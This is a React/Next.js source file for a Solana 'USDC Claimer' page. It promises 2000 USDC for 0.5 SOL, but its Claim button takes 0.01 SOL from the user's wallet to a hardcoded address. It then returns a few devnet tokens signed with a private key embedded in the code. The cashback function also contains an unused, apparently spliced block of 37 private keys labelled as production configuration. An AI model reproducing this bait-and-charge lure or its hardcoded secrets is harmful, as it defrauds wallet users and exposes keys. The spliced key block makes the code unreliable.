/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3ReMqv6KNJtpAy3Xn1MiXqAaMksMydMRiS43GQNvFgHVCdN8PxdkcY2H1LFaY1XTjt4vNVzQEcH4sBFwFX46xNtm"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3x3269EK3hfdgEAjYLAr5duELHRTWn5bhChdbJoqqcEKcFKRxXyw4HraBVfvGE4ddvMDYzpe1qkiqFZWe6cVUZNn",
  "key1": "2zYigab8mwfdycrzR5BsEkYxvbaJZmYCA3apuRJ7KWubCTEcK6ZdwqdVivgzFz7VRpx3oXriGmx2nDrEjUa6H3nr",
  "key2": "2saFJHtu39wRhi4XfdyoNnMGyWsjqmpPWUy96HTBPiy7VDQxw8c4w6QBqJFDLJe61K7uJdYDwYEXRZAAmpp5i8jy",
  "key3": "8DsCgh6m8w14zZq91wX2ZqxsZXRgqJmDQvmcQWFafiNuJj954WDsZcRvErEWX3wCBUXMswyMo1z1JtiGv1d16rD",
  "key4": "3yTbcxSgMVNbvHT4sxPAPSQXL2vS3RSdf6ADGcRppjpCVvACYgzGj9vvgyAs4FZj3C83xZXRjSu618JxGmugPRiz",
  "key5": "46dAYF8rNo8isggezMcTSha1364ih8YQL9KC11DNnv4xoUmpoVpoqCf7AFqPVwwZuUPtVh6tgTnz6cCjNAa6mDin",
  "key6": "46DimqKTredytAb6SvEwLWfCvXrUsq1XXdqKpG7ZyVqCTAHWJnpn84ZnJ9cEdGLeUUBQtBNQAZ5jfaNfgyQW8rom",
  "key7": "4fcXCRGYe9TUWoG2YD6B5YHsfstuG3Td4791KbQGbQ7Supuv77bpQcNrU3yBjwJcY9JbGdz14is4wVj6jYZzpsX5",
  "key8": "4rhYtMdqFLSryV8XdJXLdBtR64VjXVTEA1V5DybN6zPokMS8HmoDycxRRriag2TJTSAV5Yv7Z6ssgYTrgpBZjaKm",
  "key9": "YuCXnnSoLeGZKxj9ySAGa4hNaFaZxvisA2ZceF2P1SxRXrvWfLP79Fmz4pxiHhPWiTPjSTWBPBdurFPkaHGdvpt",
  "key10": "5VEqbawKkkwFqVJUwWQA3DH8HzXaUAgVAgAxyKAUuUjzBDvjYqg3gEZ6rkCVNmUhXAQomMR9rNUL37Hh1WfmEpgB",
  "key11": "4gpYzBdq7xhpGSy4oyEnpnWFH54zEsSV1LexG5PhvzYP5E5z7v98hokc8jUujp9eXFWwMAhPLS5VYFtxzgRmmhMN",
  "key12": "5DJT9eM29cPn68hUx4AcPSykCgiDej9QrvEZyxAzR9SsKddGACuNUxFCur5j4K7xE28AxNnvVbLN782kuM8oVFPP",
  "key13": "tRgiawmghW84pFKdH3Jn93j3ic8nLPq92ph5Uf6aZBDL3jqxr9Pp1yNkWUHwKH31rYh7b7MFETkp6YPgNqrRrMX",
  "key14": "3VT9ZJwzj3vwsqscxUqHme3kSsuAPi58JDvQTEkw7tiKA27V3qnV84L3cdtqeTXboJqA6C2sjV1biJmpc7vwJ6mT",
  "key15": "CsD3kwnuBvn2XbnHZSvq8dhbWMX4pnDmWSWseAPePuZciA3BKcByiXugdM5QwhHuGVPNskzW7ZocG35XSZ8Lnzx",
  "key16": "yvcqYDoa3mB8cKBEHxdohR44HES6VumaaApCQSCcKMAJNdTTqzRHqAm7t4YZCDncvJbkjQ6JjdfTrgJ5cq7vKTb",
  "key17": "36TFRBCEcUjFW86mQUDUJxHVABuMB6jQRyY57wAExxW8dwyU96FKvmsUHxKu4zYMnCbsu5oYQxSEpKkTK3QsYMyH",
  "key18": "2TC7EwtuGtPhWTXhey3cJR51MwVYNf3u3J6tguevaqyXE6ghzGCBUCc8aaX6vf29DVoeS8fc6QxikX7oX19zsNjA",
  "key19": "56Cx1kCs2g6X6B77wUKVmv474ohdtmY2VtSBdGLNnqCyspNootq7d6TBe5No8GvDu3h2X5arAEHfGbojhvWqLznD",
  "key20": "51uYgZHzxVwmrg5fDyrHkV1o1eZbX27mQ2frb1ZA6Q23PYcNs2xfHUJeAVogoDGGTmzPXEx2iAguPWom8jvEw3JS",
  "key21": "3bv78Bu2ED173MReQuxqsC5xCrBJ7F433VL5mBgfMBndN9CzFaL37o3cAiRW8ciQV58DuiX4uMQgAWUSdwP5YNo3",
  "key22": "5nczLMCrJfrTSWx4GGcr4YdPrhiqbFExucBJbugM35HxzWL3jefjPgYtzhRYbyyBc5E3hTYcp1xSFJkQJTMB1mCZ",
  "key23": "3Bf5GEWfL6DPqzSfo5W5aFrhnW4gFRDzacgNQanGKwLsvr8xZ4MA41giAKuFypkxEznpyv5CXs19BGQqi4hXZtxp",
  "key24": "bzstbWeDZ1c11RzXaPV69jH57JgRo2bqNY39gFEikjnQkhf2qcPBroHdygJYMV45icdqBx8J7MCv6mgoFZ5mJES",
  "key25": "5jfpQ9csHM1L5aZvZJGrejJB3kMZgevzhuhPMBxnKg9uwBVXXQ9VZVBMgsouwYjWJJoChMB2M8mrQFmDY3Zq5cFi",
  "key26": "3XqAWRLWq4UbydpjsqZzRk8f5JxhwH7vt3iSbibc1xQVo5GHe33kj8MHT2r9eArrFk3cKXqZ9QkbbwafAuGDdYwP",
  "key27": "3vgygvCQLjeuHF1QHDB7vgz1oktRFUKU2y2UgZJPQ7EcMremQSBDa89wT7KJrJhTpNSf5ihCHEcyhBuyyvieztTX",
  "key28": "5rhGiPB27ZYv8c13tkWjDtPQpunBapj9TKtSPnLJDToEENXqdJPDgnKoudAtzH8S3K8FBhrkfvD4ZZYSxDVfnB3z",
  "key29": "5r1h3jdowv5ysaWhHg8UQP7WgaBPuCvxCS7JkmEvWPrGNQr4hXjXcAkX22dvtxhfnMzh3HBWHf7vFNpLaT3gRiyQ",
  "key30": "3ovxws8mXX2nod6aFrQPZay3Bw1xQbWSFvVCpBEEfbLvvcjwhBkBDW6h56XdnsvdscwQ1V9F7qvLaRx81vTnsa3U",
  "key31": "RL6fAqWi1jxHWVJRCbWHJWoUveiiRbu4zSszLHGtZiNvPExjgLnHBjzreT33aorQZVTqmRYZneUZCwFnyqtYM7s",
  "key32": "3jUgxEAsRC1omNaMviGHGmt4wJ2hqRwoYmrbP2VEq2bZznGy4gryKGZodJBXxPBytXQsg7e7npptwWqL9ug8X3Hr",
  "key33": "5AtxsUskALvTb6hzYCquubEHapSH2A2bz2aZUXAQcAGEXHeyGCbHGFbiCy9r3PVU8443ttwFGPiojHdxbbjzNuY1",
  "key34": "4TZ153Nk9K1hgKbMj3PcY2mmmjht4GcxUzFvyWLttVbz8pfMCYszAnpe9oYh7bdAGqSkmZDJokvZb3y3wSHKQra6",
  "key35": "2HPxuqDyXacAc4QfhLefagMNo4ZtQbnBsHVtwUbzyWihFzquwUgQBTm986kXqdBxJKQLCLBqkkuM2ttcajBiYEmx",
  "key36": "zaZJkBpjkohJnQaY4ETfBWjC4g86WBjN6ZHt6k9zWozU3WThGS6Y9HfdyWLr7ceCYvbAVmt1PtSYagqa6U2mZfM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
